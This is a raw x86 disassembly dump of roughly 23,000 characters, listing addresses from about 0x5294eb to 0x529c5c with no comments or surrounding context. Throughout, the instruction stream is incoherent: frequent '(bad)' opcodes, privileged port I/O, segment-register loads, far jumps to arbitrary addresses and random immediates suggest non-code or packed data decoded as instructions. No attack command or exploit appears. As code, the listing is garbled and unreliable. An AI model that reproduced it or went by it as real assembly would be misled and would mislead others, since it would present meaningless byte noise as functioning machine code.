  5294eb:	mov    ecx,0xad38d9bb
  5294f0:	test   edx,edx
  5294f2:	ins    DWORD PTR es:[edi],dx
  5294f3:	mov    ch,0xb8
  5294f5:	cmp    al,BYTE PTR [edx-0x890de93]
  5294fb:	sub    eax,0xaab15ba5
  529500:	mov    al,ds:0xcebea29d
  529505:	out    0x6f,al
  529507:	mov    eax,ds:0x2e1fd7ea
  52950c:	mov    ds:0x569141ff,eax
  529511:	mov    edi,0xeb9f4642
  529516:	data16 jg 0x5294a1
  529519:	lea    ebp,[esi+ecx*8-0x537a4d2f]
  529520:	xlat   BYTE PTR ds:[ebx]
  529521:	aam    0x5f
  529523:	dec    ebx
  529524:	push   0x4b
  529526:	mov    ch,ah
  529528:	inc    edi
  529529:	scas   al,BYTE PTR es:[edi]
  52952a:	mov    dh,0x34
  52952c:	js     0x52950f
  52952e:	popf   
  52952f:	adc    DWORD PTR gs:[eax],0xffffffd5
  529533:	stos   DWORD PTR es:[edi],eax
  529534:	scas   eax,DWORD PTR es:[edi]
  529535:	or     cl,al
  529537:	push   cs
  529538:	lods   al,BYTE PTR ds:[esi]
  529539:	and    ah,dl
  52953b:	(bad)  
  52953c:	lock repz cld 
  52953f:	mov    ds:0x5908b603,al
  529544:	adc    edi,ebp
  529546:	sbb    BYTE PTR ds:0xca8ef067,cl
  52954c:	xchg   eax,ebp
  52954e:	pop    es
  52954f:	xchg   ebp,eax
  529550:	pop    ss
  529551:	int3   
  529552:	not    BYTE PTR [ecx]
  529554:	(bad)  
  529555:	push   esi
  529556:	push   esi
  529557:	xor    eax,0x178313f4
  52955c:	aam    0x51
  52955e:	and    BYTE PTR [eax-0x38],0xce
  529562:	inc    ebp
  529563:	retf   0x474f
  529566:	rcl    BYTE PTR [esi],cl
  529568:	das    
  529569:	mov    esp,0xe328c298
  52956e:	mov    ch,BYTE PTR [ecx]
  529570:	fmul   QWORD PTR [ebp-0x7645a532]
  529576:	cmp    DWORD PTR [ebx+0x58],esi
  529579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52957a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52957b:	fst    DWORD PTR [eax]
  52957d:	cmp    esi,0xe28129b2
  529583:	loope  0x52953e
  529585:	jge    0x529516
  529587:	lds    ecx,FWORD PTR [esi+0x5d]
  52958a:	out    dx,eax
  52958b:	push   esi
  52958c:	add    BYTE PTR [eax+eax*8+0x3510c3f9],dl
  529593:	loopne 0x5295d3
  529595:	jo     0x52952b
  529597:	popa   
  529598:	pop    ebx
  529599:	cli    
  52959a:	rcr    DWORD PTR [ecx],0x7f
  52959d:	pop    ss
  52959e:	lahf   
  52959f:	pop    esp
  5295a0:	sbb    BYTE PTR [eax+ebx*4+0x74],ch
  5295a4:	jb     0x529554
  5295a6:	(bad)  
  5295a7:	in     al,dx
  5295a8:	xor    al,BYTE PTR [ebx+0x5af14470]
  5295ae:	jae    0x529566
  5295b0:	cmp    ch,bh
  5295b2:	cwde   
  5295b3:	inc    eax
  5295b4:	sti    
  5295b5:	inc    esi
  5295b6:	aam    0x50
  5295b8:	fwait
  5295b9:	mov    dh,0xdf
  5295bb:	push   edx
  5295bc:	cld    
  5295bd:	sub    DWORD PTR [edx+0x42bf7015],ebx
  5295c3:	push   eax
  5295c4:	push   0xfffffff6
  5295c6:	loopne 0x529634
  5295c8:	dec    edx
  5295c9:	pop    ebx
  5295ca:	mov    dh,0xc1
  5295cc:	ins    DWORD PTR es:[edi],dx
  5295cd:	mov    bh,BYTE PTR [edi]
  5295cf:	rol    DWORD PTR [edx+0x44],cl
  5295d2:	push   cs
  5295d3:	xchg   edx,eax
  5295d4:	ins    BYTE PTR es:[edi],dx
  5295d5:	mov    ?,WORD PTR ds:0x33c1c90
  5295db:	imul   esi,DWORD PTR [edi-0x6f],0xffffff9b
  5295df:	shl    BYTE PTR [edx],cl
  5295e1:	jne    0x529638
  5295e3:	pop    es
  5295e4:	jmp    0xf61652e5
  5295e9:	cli    
  5295ea:	fisttp DWORD PTR [ebx+0x63]
  5295ed:	lods   eax,DWORD PTR ds:[esi]
  5295ee:	popf   
  5295ef:	fwait
  5295f0:	xchg   BYTE PTR [esi-0x1b],al
  5295f3:	stos   BYTE PTR es:[edi],al
  5295f4:	push   esi
  5295f5:	jae    0x52958b
  5295f7:	sbb    ecx,DWORD PTR [eax]
  5295f9:	clc    
  5295fa:	add    DWORD PTR [edi-0x15309e43],esp
  529600:	mov    ecx,DWORD PTR [ebp-0x3b06c141]
  529606:	adc    eax,0xdd831441
  52960b:	pushf  
  52960c:	xchg   edi,eax
  52960d:	mov    BYTE PTR [eax+eax*4],bl
  529610:	mov    cl,0x4c
  529612:	ret    0x7c80
  529615:	sahf   
  529616:	(bad)  
  529617:	jle    0x52961c
  529619:	or     ch,BYTE PTR [ecx+eax*2]
  52961c:	pusha  
  52961d:	jg     0x529664
  52961f:	pop    esi
  529620:	pop    esp
  529621:	jmp    0x529600
  529623:	add    al,0xc6
  529625:	pop    esp
  529626:	ins    DWORD PTR es:[edi],dx
  529627:	pop    ecx
  529628:	or     DWORD PTR [edx+0x1a],ebp
  52962b:	std    
  52962c:	xchg   esi,eax
  52962d:	add    BYTE PTR [ecx+0x62306dba],cl
  529633:	jb     0x52968c
  529635:	or     ch,bh
  529637:	retf   
  529638:	popa   
  529639:	push   ds
  52963a:	push   eax
  52963b:	xchg   ecx,eax
  52963c:	(bad)  
  52963d:	in     al,dx
  52963e:	aad    0xdb
  529640:	ins    BYTE PTR es:[edi],dx
  529641:	mov    ds:0x2222d056,al
  529646:	aaa    
  529647:	inc    esi
  529648:	fistp  DWORD PTR [eax-0x2a840b74]
  52964e:	jl     0x5295e2
  529650:	loopne 0x52963d
  529652:	sub    bh,dl
  529654:	mov    al,BYTE PTR [ecx-0x7ffbab1f]
  52965a:	(bad)  
  52965b:	xlat   BYTE PTR ds:[ebx]
  52965c:	jl     0x5296b1
  52965e:	ja     0x529649
  529660:	pop    ebp
  529661:	inc    ecx
  529662:	adc    eax,0x885eba06
  529667:	dec    eax
  529668:	xchg   ebp,eax
  529669:	add    al,0x3b
  52966b:	repz hlt 
  52966d:	(bad)  
  52966e:	out    dx,eax
  52966f:	outs   dx,BYTE PTR ds:[esi]
  529670:	cmp    al,0x17
  529672:	dec    esi
  529673:	jnp    0x5296f0
  529675:	pop    ss
  529676:	dec    esi
  529677:	cmp    al,0xc
  529679:	mov    ds:0xea7758eb,eax
  52967e:	push   ebx
  52967f:	out    dx,al
  529680:	sub    al,0x3e
  529682:	cmp    al,0xbd
  529684:	out    dx,al
  529685:	retf   
  529686:	dec    ebp
  529687:	lods   al,BYTE PTR ds:[esi]
  529688:	sub    DWORD PTR [edi-0x703dfe4c],edx
  52968e:	sar    ebx,0x5a
  529691:	loop   0x529681
  529693:	cmp    al,0x11
  529695:	push   edi
  529696:	out    0x89,eax
  529698:	mov    fs,WORD PTR [eax+0x108866c0]
  52969e:	aas    
  52969f:	jb     0x529662
  5296a1:	rcr    BYTE PTR [ebx-0xa],cl
  5296a4:	and    al,0x2c
  5296a6:	inc    esp
  5296a7:	lock test eax,0xb68dd3f0
  5296ad:	popa   
  5296ae:	imul   eax,DWORD PTR [ecx],0xebda51fa
  5296b4:	in     al,0x5f
  5296b6:	or     eax,0x818cc353
  5296bb:	xchg   DWORD PTR [ebx+0x6c],edi
  5296be:	loope  0x5296ee
  5296c0:	rol    DWORD PTR [ebx-0x23d6ebdb],1
  5296c6:	inc    eax
  5296c7:	rcr    BYTE PTR [ecx],cl
  5296c9:	imul   esp,eax,0xfffffffc
  5296cc:	jmp    0x529746
  5296ce:	mov    esp,0x82fb8d06
  5296d3:	mov    cs,ebp
  5296d5:	jb     0x5296fc
  5296d7:	dec    eax
  5296d8:	imul   ebx,DWORD PTR [edi],0xcd654ca5
  5296de:	(bad)  
  5296df:	push   esi
  5296e0:	mov    edx,0x32b542aa
  5296e5:	add    cl,dh
  5296e7:	inc    edi
  5296e8:	pop    esi
  5296e9:	fwait
  5296ea:	repnz inc eax
  5296ec:	dec    ebp
  5296ed:	fdivr  QWORD PTR [esi+0x649ff055]
  5296f3:	add    edx,DWORD PTR [ebp-0x4]
  5296f6:	cmp    DWORD PTR [esi+eax*4+0x4d],edx
  5296fa:	adc    DWORD PTR [edi],ebx
  5296fc:	pop    esi
  5296fd:	pop    ds
  5296fe:	fiadd  DWORD PTR [eax+edi*8]
  529701:	pop    ebp
  529702:	xor    DWORD PTR [ebp-0x47c0a24f],edx
  529708:	fsub   st(7),st
  52970a:	in     al,0x7
  52970c:	mov    edi,0xe5a794e2
  529711:	sub    eax,0x8df1ea14
  529716:	adc    esp,esi
  529718:	into   
  529719:	mov    ds:0x2c5b7f36,al
  52971e:	xchg   esi,eax
  52971f:	add    esi,DWORD PTR [eax+0x3e]
  529722:	cmp    eax,0x3fa6500b
  529727:	push   edx
  529728:	ret    0xf3d9
  52972b:	test   DWORD PTR [edi+0x29],ebx
  52972e:	cli    
  52972f:	cmp    BYTE PTR [ecx-0x5e5bdaa6],bl
  529735:	fimul  DWORD PTR [esi]
  529737:	out    0x77,ax
  52973a:	outs   dx,DWORD PTR ds:[esi]
  52973b:	int    0x24
  52973d:	mov    WORD PTR [edx],?
  52973f:	(bad)  
  529740:	mov    esi,0xf6872469
  529745:	je     0x52978d
  529747:	into   
  529748:	and    ch,BYTE PTR [edi-0x51]
  52974b:	pop    ecx
  52974c:	sub    ah,BYTE PTR [esi-0x74]
  52974f:	jp     0x5296f4
  529751:	ss cld 
  529753:	xor    esp,DWORD PTR [edi]
  529755:	int3   
  529756:	outs   dx,BYTE PTR ds:[esi]
  529757:	in     al,0x2d
  529759:	inc    edi
  52975a:	mov    bl,0xf6
  52975c:	popf   
  52975d:	test   BYTE PTR ds:[edi],0x98
  529761:	and    eax,0x3aba24c
  529766:	add    dh,cl
  529768:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  529769:	and    ebp,DWORD PTR [ebp+ebx*4-0x27]
  52976d:	xchg   ebx,eax
  52976e:	ins    DWORD PTR es:[edi],dx
  52976f:	dec    esi
  529770:	jge    0x52971f
  529772:	sub    al,0x70
  529774:	int    0x3d
  529776:	xchg   DWORD PTR [edi],ebp
  529778:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  529779:	adc    dl,dl
  52977b:	loop   0x529752
  52977d:	repnz xchg esp,eax
  52977f:	call   0x6cf561c
  529784:	sub    ebp,DWORD PTR [ecx+ebx*8+0x6cf9c599]
  52978b:	and    al,0xd5
  52978d:	mov    BYTE PTR [ecx-0x50],bl
  529790:	clc    
  529791:	xchg   esi,eax
  529792:	jmp    0xf62d:0xae94150
  529799:	inc    ecx
  52979a:	and    eax,0xfdaed473
  52979f:	loope  0x52973f
  5297a1:	cmp    bh,BYTE PTR [edx+0x5e]
  5297a4:	and    DWORD PTR [esp+ebp*4+0x1189d28],edi
  5297ab:	inc    edx
  5297ac:	lahf   
  5297ad:	dec    esi
  5297ae:	dec    edi
  5297af:	pop    edx
  5297b0:	mov    esi,0x1502bef1
  5297b5:	ja     0x52982e
  5297b7:	sub    al,0x70
  5297b9:	out    dx,eax
  5297ba:	(bad)  
  5297bb:	pushf  
  5297bc:	mov    ecx,0x7cfff012
  5297c1:	dec    ebx
  5297c2:	mov    gs,esi
  5297c4:	jge    0x52975b
  5297c6:	inc    edx
  5297c7:	hlt    
  5297c8:	jge    0x52979c
  5297ca:	pushf  
  5297cb:	push   esi
  5297cc:	outs   dx,BYTE PTR ds:[esi]
  5297cd:	fadd   QWORD PTR [ebp+0xe]
  5297d0:	cmp    eax,edi
  5297d2:	fld    DWORD PTR [eax-0x2a]
  5297d5:	jbe    0x52979f
  5297d7:	rdpmc  
  5297d9:	mov    DWORD PTR [ebx],edx
  5297db:	sbb    DWORD PTR [esi],ebp
  5297dd:	leave  
  5297de:	test   eax,0xd8de0dcd
  5297e3:	xor    BYTE PTR [edi-0x1a42428f],ah
  5297e9:	mov    ds:0xc78fcb1d,al
  5297ee:	out    0xe7,eax
  5297f0:	and    esi,edx
  5297f2:	sub    ebx,DWORD PTR [ecx+edi*2]
  5297f5:	in     al,0x7c
  5297f7:	xchg   edx,eax
  5297f8:	mov    ebx,0xe403a171
  5297fd:	out    dx,al
  5297fe:	imul   ebx,DWORD PTR [esp+esi*2+0x4d],0x2f
  529803:	push   0x2d
  529805:	test   bh,0xd9
  529808:	daa    
  529809:	dec    ebp
  52980a:	js     0x52988a
  52980c:	push   ds
  52980d:	push   cs
  52980e:	iret   
  52980f:	jg     0x529815
  529811:	into   
  529812:	lds    edi,FWORD PTR [ebp+0x2f5e00ca]
  529818:	test   eax,0xe7881c62
  52981d:	mov    al,0x44
  52981f:	fsubr  st(5),st
  529821:	jne    0x52988d
  529823:	in     eax,0x2f
  529825:	jne    0x52981b
  529827:	repz and DWORD PTR [eax],ebp
  52982a:	icebp  
  52982b:	push   esp
  52982d:	inc    edx
  52982e:	dec    ebx
  52982f:	mov    al,0xb0
  529831:	sbb    ecx,ecx
  529833:	imul   esi,DWORD PTR [eax+ecx*2-0x3213a66f],0xffffffe9
  52983b:	mov    edx,DWORD PTR [edi-0x1410d3cd]
  529841:	dec    edi
  529842:	mov    BYTE PTR [edx-0x34],0x9
  529846:	pop    es
  529847:	mov    dh,0xc
  529849:	pop    ebx
  52984a:	or     bh,BYTE PTR [ebx-0x47]
  52984d:	test   eax,0xe08eeed7
  529852:	(bad)  
  529853:	jge    0x5298d1
  529855:	shr    DWORD PTR [esi+0x589e1b6a],1
  52985b:	aaa    
  52985c:	mul    DWORD PTR [esi]
  52985e:	in     al,0x5e
  529860:	add    bh,BYTE PTR [esi]
  529862:	jbe    0x52985f
  529864:	xor    al,0x9c
  529866:	sbb    dl,bl
  529868:	repz sbb eax,0xc876311e
  52986e:	xor    al,0x2a
  529870:	int    0xe6
  529872:	xchg   ebp,eax
  529873:	xchg   ebx,eax
  529874:	mov    esi,0x6ca8dfe3
  529879:	cmp    cl,BYTE PTR [edi]
  52987b:	and    al,BYTE PTR [edx+ebx*4]
  52987e:	mov    edx,0xc678ab2e
  529883:	pop    edi
  529884:	adc    ecx,DWORD PTR [edx-0x3130b5c4]
  52988a:	test   DWORD PTR [ecx],eax
  52988c:	sbb    BYTE PTR [edi+0x67],ch
  52988f:	mov    ss,WORD PTR [esi-0x30bcf1a6]
  529895:	(bad)  
  529896:	outs   dx,DWORD PTR ds:[esi]
  529897:	cmp    ebx,edx
  529899:	icebp  
  52989a:	push   eax
  52989b:	enter  0xa327,0xe9
  52989f:	xchg   esi,eax
  5298a0:	xchg   DWORD PTR [edi+0x5523fe37],ebp
  5298a6:	loopne 0x5298b4
  5298a8:	adc    esp,0xffffff94
  5298ab:	xchg   DWORD PTR [edi-0x74],ebp
  5298ae:	in     al,dx
  5298af:	push   0x9f17e738
  5298b4:	jl     0x529877
  5298b6:	(bad)  
  5298b7:	xchg   esp,eax
  5298b8:	mov    ch,0xef
  5298ba:	lods   al,BYTE PTR ds:[esi]
  5298bb:	sbb    eax,0x7b001fd1
  5298c0:	push   eax
  5298c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5298c2:	sub    al,0x22
  5298c4:	mov    cl,0x6
  5298c6:	ins    BYTE PTR es:[edi],dx
  5298c7:	mov    ch,0xeb
  5298c9:	mov    bl,0xa5
  5298cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5298cc:	add    BYTE PTR [ebx+ebx*2-0x1f6fe79b],bl
  5298d3:	call   0x6e02e828
  5298d8:	jbe    0x5298ea
  5298da:	addr16 mov ebp,0x3633b10e
  5298e0:	mov    al,ds:0x1994741f
  5298e5:	arpl   WORD PTR [edi+0x3bac4327],di
  5298eb:	mov    BYTE PTR [eax-0x63],dl
  5298ee:	dec    esi
  5298ef:	fwait
  5298f0:	push   0x35
  5298f2:	push   ss
  5298f3:	cs inc edx
  5298f5:	arpl   WORD PTR [edi+0x6c35db9f],si
  5298fb:	push   ebp
  5298fc:	iret   
  5298fd:	scas   al,BYTE PTR es:[edi]
  5298fe:	xchg   DWORD PTR [ebp-0x5c],edx
  529901:	inc    eax
  529902:	jg     0x52994a
  529904:	adc    bl,BYTE PTR [ecx]
  529906:	ret    0xc7b
  529909:	mov    esi,0xee20d41c
  52990e:	cmp    eax,0x5c8e326a
  529913:	mov    ah,0x33
  529915:	inc    edi
  529916:	mov    BYTE PTR [esp+ecx*2],al
  529919:	je     0x529903
  52991b:	rcl    BYTE PTR [ebp+0x59b93c9],0xf9
  529922:	mov    edi,0xfbc44fc
  529927:	jae    0x529923
  529929:	xchg   ebx,eax
  52992a:	lea    ebp,[ecx-0x472e8c4b]
  529930:	xchg   esi,eax
  529931:	not    bl
  529933:	jg     0x529938
  529935:	jae    0x529940
  529937:	fxch   st(7)
  529939:	xchg   ebx,eax
  52993a:	retf   0x721
  52993d:	xchg   ecx,eax
  52993e:	test   eax,esp
  529940:	ss std 
  529942:	mov    edx,0xc9e2249a
  529947:	mov    ah,0xd8
  529949:	stos   BYTE PTR es:[edi],al
  52994a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52994b:	fld    DWORD PTR [ebx-0x23]
  52994e:	cmp    edx,edi
  529950:	mov    esi,ecx
  529952:	mov    WORD PTR [ecx+0x17],ss
  529955:	add    eax,0x2292c79a
  52995a:	aas    
  52995b:	outs   dx,BYTE PTR ds:[esi]
  52995c:	adc    ch,BYTE PTR [esi+0x60]
  52995f:	push   es
  529960:	daa    
  529961:	push   esi
  529962:	pop    ss
  529963:	add    DWORD PTR [edi],eax
  529965:	mov    al,0x53
  529967:	repnz sbb bh,BYTE PTR [ebx+0x32515e7e]
  52996e:	cli    
  52996f:	cld    
  529970:	pop    edi
  529971:	pop    ebp
  529972:	int3   
  529973:	cmp    DWORD PTR [edi-0x49],esp
  529976:	and    esp,DWORD PTR [esi+0xc]
  529979:	and    ebp,DWORD PTR [ecx+0x60]
  52997c:	xchg   ecx,eax
  52997d:	add    DWORD PTR [edi],0xc0123cc0
  529983:	pop    edi
  529984:	addr16 pushf 
  529986:	mov    bh,0x99
  529988:	add    BYTE PTR [ebx-0x41aa4289],bh
  52998e:	hlt    
  52998f:	pop    ecx
  529990:	imul   esi,DWORD PTR [ebx+0xf03c4ba],0xffffff81
  529997:	fadd   DWORD PTR ds:0xec93dbd5
  52999d:	sbb    BYTE PTR [eax-0x5e],cl
  5299a0:	push   es
  5299a1:	sub    eax,0xa89f5660
  5299a6:	popa   
  5299a7:	or     DWORD PTR [edx],edx
  5299a9:	sbb    DWORD PTR [edx],ebp
  5299ab:	mov    ds:0x4101d3e4,eax
  5299b0:	xor    cl,BYTE PTR [esi+0x52]
  5299b3:	mov    ah,ah
  5299b5:	or     BYTE PTR [edi-0x74a73ebd],al
  5299bb:	or     DWORD PTR [edx],ebp
  5299bd:	ror    BYTE PTR [edi+0x185c730a],1
  5299c3:	rcr    BYTE PTR [esi-0x15],cl
  5299c6:	and    bh,al
  5299c8:	lds    edx,FWORD PTR [eax-0x27]
  5299cb:	xchg   esp,eax
  5299cc:	mov    BYTE PTR es:[ecx],dh
  5299cf:	cmp    al,0x1
  5299d1:	add    BYTE PTR [eax],0xee
  5299d4:	cmc    
  5299d5:	shl    BYTE PTR [eax],0x75
  5299d8:	ror    DWORD PTR [ecx],cl
  5299da:	cli    
  5299db:	cmp    eax,0x29c57062
  5299e0:	pop    es
  5299e1:	std    
  5299e2:	test   DWORD PTR [esi+0x3b532647],esp
  5299e8:	in     eax,dx
  5299e9:	repnz push esp
  5299eb:	mov    bh,0x64
  5299ed:	fdiv   st,st(7)
  5299ef:	push   es
  5299f0:	pusha  
  5299f1:	jno    0x529a1a
  5299f3:	add    esi,edi
  5299f5:	sub    ah,BYTE PTR [edi+ecx*8-0x73f637b7]
  5299fc:	sbb    DWORD PTR [esi+0xf1ba5a8],ebx
  529a02:	fcmovbe st,st(0)
  529a04:	push   esp
  529a05:	inc    ecx
  529a06:	cmp    al,0x14
  529a08:	iret   
  529a09:	xor    al,0x3d
  529a0b:	push   ebp
  529a0c:	or     al,0x2f
  529a0e:	push   es
  529a0f:	jl     0x5299f2
  529a11:	add    bl,BYTE PTR es:[ecx]
  529a14:	sub    al,0x33
  529a16:	(bad)  
  529a17:	jmp    0xdb24:0xac75f6c0
  529a1e:	or     BYTE PTR [ebp-0x68],dh
  529a21:	xchg   ebx,eax
  529a22:	call   0xf870e0f3
  529a27:	fnstsw WORD PTR [esp+esi*4+0x3e]
  529a2b:	xchg   esi,eax
  529a2c:	jns    0x5299fb
  529a2e:	add    eax,0x7fdfe4a2
  529a33:	add    edx,eax
  529a35:	mov    ch,0x43
  529a37:	push   edx
  529a38:	jmp    0x5acc2da6
  529a3d:	retf   0x49e9
  529a40:	xor    eax,0x97633a90
  529a45:	enter  0xc09d,0x8c
  529a49:	loop   0x5299cf
  529a4b:	retf   
  529a4c:	imul   esi,DWORD PTR [eax+0x54],0xffffffc2
  529a50:	sbb    ecx,esp
  529a52:	sub    ah,BYTE PTR [ecx]
  529a54:	std    
  529a55:	jecxz  0x529a5e
  529a57:	fwait
  529a58:	out    0x16,eax
  529a5a:	xor    DWORD PTR [ebp-0x6c],ebp
  529a5d:	out    0x1e,eax
  529a5f:	in     al,0x71
  529a61:	xlat   BYTE PTR ds:[ebx]
  529a62:	cmp    edx,eax
  529a64:	jle    0x529ae5
  529a66:	ret    0x503c
  529a69:	add    BYTE PTR [edi-0x4307be9e],0x7b
  529a70:	add    eax,0x647255c9
  529a75:	inc    edi
  529a76:	cmp    dl,ch
  529a78:	repnz (bad) 
  529a7a:	test   eax,0x37e4d7f5
  529a7f:	mov    DWORD PTR [eax-0x5f],ebx
  529a82:	pop    edx
  529a83:	inc    ebp
  529a84:	cli    
  529a85:	pushw  0xffae
  529a88:	nop
  529a89:	pop    edx
  529a8a:	cmp    BYTE PTR [ecx+0x15f9046e],0x7e
  529a91:	adc    DWORD PTR [eax],edi
  529a93:	cmp    edx,DWORD PTR [edi]
  529a95:	bnd jno 0x529a65
  529a98:	int3   
  529a99:	das    
  529a9a:	out    dx,eax
  529a9b:	mov    es,WORD PTR [esi+0x2d95da6d]
  529aa1:	test   BYTE PTR ds:0xd6b1f43e,al
  529aa7:	fstp   TBYTE PTR ds:0x78cb59a0
  529aad:	cld    
  529aae:	xsha1  (bad)
  529aaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  529ab0:	mov    BYTE PTR [eax+0x3f],al
  529ab3:	push   edi
  529ab4:	js     0x529aae
  529ab6:	add    al,0xec
  529ab8:	dec    edx
  529ab9:	dec    eax
  529aba:	in     eax,0xb3
  529abc:	xor    dl,BYTE PTR [ecx]
  529abe:	js     0x529ac1
  529ac0:	mov    dh,0xc8
  529ac2:	cmp    al,0x3a
  529ac4:	hlt    
  529ac5:	call   0x6346488a
  529aca:	jecxz  0x529af8
  529acc:	dec    ebp
  529acd:	in     al,0x19
  529acf:	out    dx,al
  529ad0:	pop    esp
  529ad1:	ins    BYTE PTR es:[di],dx
  529ad3:	jmp    0x529a61
  529ad5:	sbb    edi,edx
  529ad7:	cmp    bh,BYTE PTR [edx-0x350f309b]
  529add:	scas   al,BYTE PTR es:[edi]
  529ade:	sbb    bl,BYTE PTR [edi+0x58]
  529ae1:	cmp    BYTE PTR [edi],dl
  529ae3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  529ae4:	dec    ebp
  529ae5:	mov    ch,0x39
  529ae7:	cmp    ch,dl
  529ae9:	xor    ebp,DWORD PTR [edx+0x29]
  529aec:	inc    eax
  529aed:	mov    ah,0xa1
  529aef:	or     BYTE PTR [ebp+0x33ff377a],al
  529af5:	jecxz  0x529b5b
  529af7:	retf   0x8d91
  529afa:	jo     0x529b32
  529afc:	push   ecx
  529afd:	stos   BYTE PTR es:[edi],al
  529afe:	push   0xfffffff1
  529b00:	push   ds
  529b01:	out    0x4e,eax
  529b03:	jb     0x529aec
  529b05:	and    eax,DWORD PTR [ebx+ebp*4]
  529b08:	inc    esi
  529b09:	or     BYTE PTR [esi+0x7e],ah
  529b0c:	scas   eax,DWORD PTR es:[edi]
  529b0d:	xor    eax,0xd2d66041
  529b12:	lahf   
  529b13:	mov    al,0x2c
  529b15:	sar    DWORD PTR [eax],0x61
  529b18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  529b19:	jp     0x529b93
  529b1b:	test   eax,0xfa32e430
  529b20:	xchg   esp,eax
  529b21:	push   cs
  529b22:	jg     0x529b4a
  529b24:	add    ecx,DWORD PTR [eax+ebx*2]
  529b27:	imul   ebx,DWORD PTR [esi],0xc6893418
  529b2d:	in     al,0x1a
  529b2f:	out    dx,eax
  529b30:	mov    ah,0x24
  529b32:	popa   
  529b33:	mov    al,ds:0x1b3ac7e6
  529b38:	mov    ebx,DWORD PTR [ebp-0x61]
  529b3b:	push   ds
  529b3c:	jl     0x529b2c
  529b3e:	xchg   ebp,eax
  529b3f:	ja     0x529b42
  529b41:	test   ecx,esp
  529b43:	and    bl,BYTE PTR ss:[eax-0x5]
  529b47:	sbb    BYTE PTR [ebp-0x37cb0b86],0xad
  529b4e:	lahf   
  529b4f:	inc    esp
  529b50:	push   0x33f73c87
  529b55:	mov    dl,0xf9
  529b57:	push   ecx
  529b58:	imul   eax,DWORD PTR [ebx+0x4a687445],0xd6990cca
  529b62:	dec    edi
  529b63:	or     eax,0x35f120c5
  529b68:	or     al,0x3d
  529b6a:	add    BYTE PTR [eax+0x2c],cl
  529b6d:	retf   
  529b6e:	push   es
  529b6f:	pop    es
  529b70:	ins    BYTE PTR es:[edi],dx
  529b71:	lods   al,BYTE PTR ds:[esi]
  529b72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  529b73:	pop    esp
  529b74:	das    
  529b75:	xchg   ebp,eax
  529b76:	xchg   esi,eax
  529b77:	pop    edi
  529b78:	(bad)  
  529b79:	loop   0x529aff
  529b7b:	cmp    dl,BYTE PTR [eax]
  529b7d:	pop    ss
  529b7e:	jns    0x529b6f
  529b80:	loop   0x529b5d
  529b82:	add    ebx,DWORD PTR [eax-0x380a7166]
  529b88:	ret    0x7f66
  529b8b:	ins    DWORD PTR es:[edi],dx
  529b8c:	push   0xfffffff6
  529b8e:	jnp    0x529b66
  529b90:	je     0x529bd3
  529b92:	jbe    0x529b37
  529b94:	sar    DWORD PTR [esi],0xba
  529b97:	sbb    DWORD PTR [eax+0x5af6d335],edi
  529b9d:	mov    edx,DWORD PTR [esi]
  529b9f:	stc    
  529ba0:	jmp    0x529bef
  529ba2:	sub    al,0x4c
  529ba4:	in     eax,0xd5
  529ba6:	in     al,dx
  529ba7:	shl    esi,0xe1
  529baa:	out    0x98,al
  529bac:	push   0xde16ec82
  529bb1:	(bad)  
  529bb3:	xchg   edx,eax
  529bb4:	(bad)  
  529bb5:	out    0xeb,al
  529bb7:	adc    BYTE PTR [ebx-0x1],dh
  529bba:	stos   BYTE PTR es:[edi],al
  529bbb:	shr    BYTE PTR [ecx],1
  529bbd:	imul   ecx,DWORD PTR [edi-0x59242d36],0xffffff88
  529bc4:	and    ecx,DWORD PTR [ecx+0x3dd4c1ee]
  529bca:	add    eax,0xf104d9a4
  529bcf:	mov    al,0x64
  529bd1:	jle    0x529b57
  529bd3:	pop    ds
  529bd4:	push   esp
  529bd5:	mov    ecx,0xa268bc7e
  529bda:	not    BYTE PTR [ebx]
  529bdc:	add    dl,bl
  529bde:	rcl    DWORD PTR [edi-0x6a817e],cl
  529be4:	repnz push ss
  529be6:	cmp    BYTE PTR [edi],al
  529be8:	push   edx
  529be9:	jg     0x529bad
  529beb:	pop    esp
  529bec:	stos   DWORD PTR es:[edi],eax
  529bed:	popf   
  529bee:	jge    0x529b75
  529bf0:	enter  0xff83,0x5c
  529bf4:	leave  
  529bf5:	add    ebp,esi
  529bf7:	mov    ebp,0xe8e0970f
  529bfc:	push   0xffffff83
  529bfe:	in     eax,dx
  529bff:	lahf   
  529c00:	jo     0x529ba9
  529c02:	test   al,0xdd
  529c04:	sbb    eax,0xe45b6dbd
  529c09:	jmp    0x760f:0xc723a70d
  529c10:	test   al,0xec
  529c12:	xor    al,0x94
  529c14:	addr16 das 
  529c16:	ja     0x529c2f
  529c18:	ins    DWORD PTR es:[edi],dx
  529c19:	cmp    al,0xe5
  529c1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  529c1c:	je     0x529c7a
  529c1e:	add    DWORD PTR [eax-0x5562aba4],0xffffff83
  529c25:	pop    eax
  529c26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  529c27:	push   ebx
  529c28:	mov    dh,0x2e
  529c2a:	jle    0x529bdf
  529c2c:	pop    eax
  529c2d:	popa   
  529c2e:	pop    edx
  529c2f:	push   ecx
  529c30:	leave  
  529c31:	sub    esp,DWORD PTR [ebp+0x68]
  529c34:	not    BYTE PTR [esi+0x43be628]
  529c3a:	push   ss
  529c3b:	sub    ch,BYTE PTR [edi+0x5cec9a43]
  529c41:	add    bh,bl
  529c43:	pop    es
  529c44:	mov    cl,0x61
  529c46:	out    0xf3,al
  529c48:	dec    ebx
  529c49:	inc    ecx
  529c4a:	xchg   edi,eax
  529c4b:	push   cs
  529c4c:	stos   BYTE PTR es:[edi],al
  529c4d:	and    DWORD PTR [edi],ebp
  529c4f:	(bad)  
  529c50:	jo     0x529be5
  529c52:	xchg   edi,eax
  529c53:	sti    
  529c54:	fcmovnbe st,st(7)
  529c56:	std    
  529c57:	lods   eax,DWORD PTR ds:[esi]
  529c58:	neg    BYTE PTR [esi+ebx*8]
  529c5b:	(bad)  
  529c5c:	daa    
